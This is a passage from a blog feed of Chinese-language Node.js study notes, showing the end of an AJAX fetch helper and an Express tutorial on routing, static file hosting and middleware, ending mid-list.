 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">http</span>(<span class="params">&#123;method, url, params, data&#125;</span>)&#123;</span><br><span class="line">    <span class="comment">// params 需要轉換成 key=value&amp;key=value 的形式</span></span><br><span class="line">    <span class="keyword">if</span>(params)&#123;</span><br><span class="line">        <span class="comment">// 固定寫法： new URLSearchParams(params).toString()</span></span><br><span class="line">        <span class="keyword">let</span> str = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(params).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="comment">// 拼接到 url</span></span><br><span class="line">        url += <span class="string">&#x27;?&#x27;</span> + str</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最終結果</span></span><br><span class="line">    <span class="keyword">let</span> res</span><br><span class="line">    <span class="comment">// data 需要寫完整的代碼</span></span><br><span class="line">    <span class="keyword">if</span>(data)&#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">            method,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">fetch</span>(url)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>AJAX</category>
      </categories>
      <tags>
        <tag>AJAX</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - Express</title>
    <url>/myBlog/2022/08/03/2022/2022-8-3-NodeJS-Express/</url>
    <content><![CDATA[<h2 id="express簡介"><a href="#express簡介" class="headerlink" title="express簡介"></a>express簡介</h2><ol>
<li><p><code>express</code>簡介：</p>
<ul>
<li>基於 Node.js 平台，快速、開放、極簡的<font color="#f54747"> Web 開發框架</font></li>
<li>作用和 Node.js 內置的<code>http</code>模塊類似，專門用於創建 Web 服務器的</li>
</ul>
</li>
<li><p><code>express</code>本質：</p>
<ul>
<li><code>npm</code>上的第三方包，提供了快速創建 Web 服務器的便捷方法</li>
<li>官方網址：<a href="https://expressjs.com/zh-tw/">https://expressjs.com/zh-tw/</a></li>
</ul>
</li>
<li><p><code>express</code>運用場景：  </p>
<ul>
<li><font color="#f54747">Web 網站服務器</font>：專門對外提供 Web 網頁資源的服務器</li>
<li><font color="#f54747">API 接口服務器</font>：專門對外提供 API 接口的服務器</li>
<li>使用<code>express</code>可以方便、快捷的創造 Web 網站服務器或 API 接口服務器</li>
</ul>
</li>
</ol>
<h2 id="express基本使用"><a href="#express基本使用" class="headerlink" title="express基本使用"></a>express基本使用</h2><ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i express</span><br></pre></td></tr></table></figure>

</li>
<li><p>創建Web服務器：</p>
<ul>
<li>使用<code>express</code>創建服務器</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 創建Web服務器</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 啟動Web服務器</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;express server running at http://127.0.0.1:3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="客戶端與服務器交互"><a href="#客戶端與服務器交互" class="headerlink" title="客戶端與服務器交互"></a>客戶端與服務器交互</h3><ol>
<li><p>監聽<code>GET</code>請求：</p>
<ul>
<li>使用<code>app.get</code>方法，監聽客戶端的<code>GET</code>請求</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;url&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="comment">/*處理函數*/</span> &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>監聽<code>POST</code>請求：</p>
<ul>
<li>使用<code>app.post</code>方法，監聽客戶端的<code>POST</code>請求</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;url&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="comment">/*處理函數*/</span> &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>把內容響應給客戶端：</p>
<ul>
<li>使用<code>res.send</code>方法，把處理好的內容發送給客戶端  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 監聽客戶端的 GET 和 POST 請求，並向客戶端響應內容</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/user&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 調用 express 提供的 res.send 方法向客戶端響應 JSON 對象</span></span><br><span class="line">    res.<span class="title function_">send</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>, <span class="attr">gender</span>:<span class="string">&#x27;Male&#x27;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/user&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 調用 express 提供的 res.send 方法向客戶端響應文本字符串</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Request succeeded&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;express server running at http://127.0.0.1:3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="獲取路徑中攜帶的參數"><a href="#獲取路徑中攜帶的參數" class="headerlink" title="獲取路徑中攜帶的參數"></a>獲取路徑中攜帶的參數</h3><ol>
<li><p><code>query</code>類型的參數：</p>
<ul>
<li>通過<code>req.query</code>對象，訪問到客戶端通過查詢字符串的形式發送給服務器的參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>params</code>類型的參數：</p>
<ul>
<li>通過<code>req.params</code>對象，訪問到客戶端通過查詢字符串的形式發送給服務器的參數</li>
<li>使用<code>params</code>類型參數必須添加佔位符<code>/:xxx</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:name/:age&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="托管靜態資源"><a href="#托管靜態資源" class="headerlink" title="托管靜態資源"></a>托管靜態資源</h3><ol>
<li><p>創建靜態資源服務器：</p>
<ul>
<li><p>使用<code>express.static</code>函數創建一個靜態資源服務器</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))    <span class="comment">// 防止路徑動態拼接問題</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>將<code>public</code>目錄下的圖片、CSS文件、JavaScript文件對外開放訪問</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:3000/images/bg.jpg</span><br><span class="line">http://127.0.0.1:3000/css/style.css</span><br><span class="line">http://127.0.0.1:3000/js/login.js</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意：Express在<font color="#f54747">指定的</font>靜態目錄中查找文件，並對外提供資源的訪問路徑。因此<font color="#f54747">存放靜態文件的目錄名不會出現在URL中</font></p>
</li>
</ul>
</li>
<li><p>托管多個靜態資源目錄：</p>
<ul>
<li>多次調用<code>express.static</code>函數即可  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/files&#x27;</span>)))</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：如果托管的目錄中有重名的文件，會查找優先添加的文件（<font color="#f54747">文件會根據目錄的添加順序查找</font>）</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="express路由"><a href="#express路由" class="headerlink" title="express路由"></a>express路由</h2><ol>
<li><p>簡介：</p>
<ul>
<li><p><code>Express</code>中的路由指<font color="#f54747">客戶端的請求</font>與<font color="#f54747">服務器處理函數</font>之間的映射關係</p>
</li>
<li><p>可以直接將路由掛載到<code>app</code>上，就是<code>app</code>直接掛載監聽</p>
</li>
<li><p>但<font color="#f54747">推薦將路由抽離為單獨的模塊</font>，更方便對路由進行模塊化的管理</p>
</li>
</ul>
</li>
<li><p>創建路由模塊：</p>
<ul>
<li>使用<code>express.Router</code>創建路由實例再導出</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入 express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 創建路由對象</span></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 掛載具體路由</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/user/list&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Get user list&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/user/add&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Added new user&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 向外導出路由對象</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>註冊路由模塊：</p>
<ul>
<li>使用<code>app.use</code>函數註冊路由中間件</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入路由模塊</span></span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&#x27;./router&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 註冊路由模塊</span></span><br><span class="line">app.<span class="title function_">use</span>(userRouter)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>為路由模塊添加前綴：</p>
<ul>
<li>類似於托管靜態資源時，為靜態資源統一掛載訪問前綴一樣</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, userRouter)     <span class="comment">// 添加訪問前綴</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="express中間件"><a href="#express中間件" class="headerlink" title="express中間件"></a>express中間件</h2><ol>
<li><p>簡介：</p>
<ul>
<li>中間件 (Middleware) ，指業務流程的<font color="#f54747">中間處理環節</font></li>
<li>中間件必須有輸入與輸出，前一級的輸出作為下一級的輸入</li>
</ul>
</li>
<li><p><code>Express</code>中間件調用流程：</p>
<ul>
<li>當一個請求到達<code>Express</code>服務器之後，可以連續調用多個中間件，對此次請求進行<font color="#f54747">預處理</font></li>
<li>圖示：  <img src="https://p.ipic.vip/m6obwm.png" width="600px"></li>
</ul>
</li>
<li><p>中間件語法：</p>
<ul>
<li><code>Express</code>中間件本質上就是一個<code>function</code>處理函數</li>
<li>只是中間件函數的參數列表中<font color="#f54747">必須包含<code>next</code>參數</font></li>
<li><code>next</code>函數是實現<font color="#f54747">多個中間件連續調用</font>的關鍵，它表示把流轉關係<font color="#f54747">轉交</font>給下一個中間件或路由</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定義中間件函數：</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">mw</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;This is a middleware&#x27;</span>)</span><br><span class="line">    <span class="title function_">next</span>()  <span class="comment">// 把流轉關係轉交給下一個中間件或路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>中間件的注意事項：</p>
<ol>
<li><p>必須在路由之前註冊中間件</p>
</li>
<li><p>客戶端發送過來的請求，可以連續調用多個中間件進行處理</p>
</li>
<li><p>執行完中間件的代碼之後，必須調用<code>next</code>函數</p>
</li>
<li><p>為了防止代碼邏輯的混亂，調用<code>next</code>函數之後不要再寫額外的代碼</p>
</li>
<li><p>連續調用多個中間件的時候，多個中間件之間共享<code>req</code>和<code>res</code>對象</p>
</li>
</ol>
</li>
</ol>
<h3 id="全局中間件"><a href="#全局中間件" class="headerlink" title="全局中間件"></a>全局中間件</h3><ol>
<li><p>簡介：</p>
<ul>
<li>全局生效的中間件就是客戶端發起的<font color="#f54747">任何請求</font>到達服務器之後都會觸發</li>
</ul>
</li>
<li><p>定義全局中間件：</p>
<ul>
<li>使用<code>app.use</code>函數註冊全局中間件</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(mw)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定義多個全局中間件：</p>
<ul>
<li>使用<code>app.use</code>函數連續註冊多個全局中間件</li>
<li>客戶端請求到達服務器之後，會按照中間件的註冊順序依次調用</li>
</ul>
</li>
<li><p>全局中間件作用：</p>
<ul>
<li>由於多個中間件之間是<font color="#f54747">共享同一個<code>res</code>和<code>req</code></font>，可以在前面的中間件統一為<code>res</code>或<code>req</code>對象添加自訂義屬性和方法，給後續中間件或路由使用</li>
<li>例子：為所有路由添加發送請求時間  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中間件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mw</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    req.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()  <span class="comment">// 獲取請求到達服務器時間</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(req.<span class="property">startTime</span>)     <span class="comment">// 直接訪問中間件中添加的屬性與方法</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="局部中間件"><a href="#局部中間件" class="headerlink" title="局部中間件"></a>局部中間件</h3><ol>
<li><p>簡介：</p>
<ul>
<li>不使用<code>app.use</code>函數註冊的中間件，請求到達服務器不會立即觸發</li>
</ul>
</li>
<li><p>註冊局部中間件：</p>
<ul>
<li>在路由函數中添加中間件參數</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, mw, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定義多個局部中間件：</p>
<ul>
<li>路由函數中：<ol>
<li>參數形式傳入</li>
<li>包裝成一個數組傳入</li>
</ol>
</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, mw1, mw2, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>) &#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, [mw1, mw2], <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="中間件分類"><a href="#中間件分類" class="headerlink" title="中間件分類"></a>中間件分類</h3><h4 id="應用級別中間件"><a href="#應用級別中間件" class="headerlink" title="應用級別中間件"></a>應用級別中間件</h4><ul>
<li><p>通過<code>app.use()</code>、<code>app.get()</code>或<code>app.post()</code>綁定到<code>app</code>實例上的中間件</p>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 應用級別中間件（全局中間件）</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; <span class="title function_">next</span>() &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 應用級別中間件（局部中間件）</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, mw, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="路由級別中間件"><a href="#路由級別中間件" class="headerlink" title="路由級別中間件"></a>路由級別中間件</h4><ul>
<li><p>綁定到<code>express.Router()</code>實例上的中間件，與應用級別中間件沒有區別</p>
</li>
<li><p>只是應用級別中間件是綁定到<code>app</code>實例上，而路由級別中間件事綁定到<code>router</code>實例上</p>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由級別中間件</span></span><br><span class="line">router.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; <span class="title function_">next</span>() &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, router)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="錯誤級別中間件"><a href="#錯誤級別中間件" class="headerlink" title="錯誤級別中間件"></a>錯誤級別中間件</h4><ul>
<li><p>專門用來捕獲整個項目中發生的異常錯誤，防止項目異常崩潰問題</p>
</li>
<li><p>錯誤級別中間件的處理函數中第一個形參是<code>err</code></p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(err, req, res, next) =&gt; &#123;  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Server error&#x27;</span>)     <span class="comment">// 拋出自定義錯誤</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Home Page&#x27;</span>)       <span class="comment">// 後續程序不會執行</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 錯誤級別中間件</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;ERROR!!!&#x27;</span>, err.<span class="property">message</span>)    <span class="comment">// 在服務器打印錯誤消息</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;ERROR!!! &#x27;</span> + err.<span class="property">message</span>)         <span class="comment">// 向客戶端響應錯誤內容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意：<font color="#f54747">錯誤級別中間件必須註冊在所有路由之後！！！</font></p>
</li>
</ul>
<h4 id="Express內置中間件"><a href="#Express內置中間件" class="headerlink" title="Express內置中間件"></a>Express內置中間件</h4><ul>
<li>Express 4.16.0 版本之後，<code>Express</code>內置了三個常用的中間件，提高<code>Express</code>項目開發效率和體驗</li>
</ul>
<ol>
<li><p><code>express.static</code></p>
<ul>
<li>用於快速托管靜態資源的內置中間件（<code>HTML</code>文件、圖片、<code>CSS</code>樣式等）</li>
</ul>
</li>
<li><p><code>express.json</code></p>
<ul>
<li><p>用於解析<code>JSON</code>格式的請求體數據</p>
</li>
<li><p>解析：<code>application/json</code>格式的數據</p>
  <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Donald&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>註冊中間件：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服務器中使用 req.body 屬性接收請求體數據</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>express.urlencoded</code></p>
<ul>
<li><p>用於解析<code>URL-encoded</code>格式的請求體數據</p>
</li>
<li><p>解析：<code>application/x-www-form-urlencoded</code>格式的數據</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;name=Donald&amp;age=18&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>註冊中間件：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br></pre></td></tr></table></figure>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服務器中使用 req.body 屬性接收請求體數據</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>) &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="第三方中間件"><a href="#第三方中間件" class="headerlink" title="第三方中間件"></a>第三方中間件</h4><ul>
<li><p>由第三方開發出來的中間件，在項目中按需下載第三方中間件以提高效率</p>
</li>
<li><p>使用步驟：</p>
<ol>
<li><p><code>npm</code>安裝中間件</p>
</li>
<li><p>使用<code>require</code>導入中間件</p>
</li>
<li><p>使用<code>app.use</code>註冊並使用中間件</p>
</li>
</ol>
</li>
<li><p>例子：<code>body-parser</code>解析請求體</p>
<ol>
<li><p>安裝<code>body-parser</code>中間件</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i body-parser</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入、註冊並使用<code>body-parser</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入解析表單數據的中間件 body-parser</span></span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 註冊並使用 body-parser</span></span><br><span class="line">app.<span class="title function_">use</span>(parser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>注意：<code>Express</code>內置的<code>express.urlencoded</code>中間件，就是基於<code>body-parser</code>第三方中間件進一步封裝出來的</li>
</ul>
</li>
</ul>
<h3 id="自定義中間件"><a href="#自定義中間件" class="headerlink" title="自定義中間件"></a>自定義中間件</h3><ol>
<li><p>定義中間件</p>
<ul>
<li>通過<code>app.use</code>函數註冊並使用中間件</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; &#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>監聽<code>req</code>的<code>data</code>事件</p>
<ul>
<li>中間件中需要監聽<code>req</code>的<code>data</code>事件來獲取客戶端發送到服務器的數據</li>
<li>如果數據量比較大，無法一次性發送完畢，<font color="#f54747">客戶端會把數據切割後，分批發送到服務器</font>，所以<code>data</code>事件可能會觸發多次，每一次觸發<code>data</code>事件時，<font color="#f54747">獲取到的數據只是完整數據的一部分</font>，需要手動對接收到的數據進行拼接</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 儲存客戶端傳送過來的請求體數據</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 監聽 req 的 data 事件</span></span><br><span class="line">req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">    str += chunk</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>監聽<code>req</code>的<code>end</code>事件</p>
<ul>
<li>當請求體數據接收完畢後，會自動觸發<code>req</code>的<code>end</code>事件</li>
<li>可以在<code>req</code>的<code>end</code>事件中，<font color="#f54747">拿到並處理完整的請求體數據</font></li>
<li>具體編碼：</li>
</ul>
</li>
<li><p>使用<code>querystringify</code>第三方插件解析請求體數據</p>
<ul>
<li><p>安裝：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i querystringify</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入並使用：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入 querystringify</span></span><br><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">&#x27;querystringify&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析請求體數據</span></span><br><span class="line">qs.<span class="title function_">parse</span>(str)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>將解析出來的數據掛載為<code>req.body</code></p>
<ul>
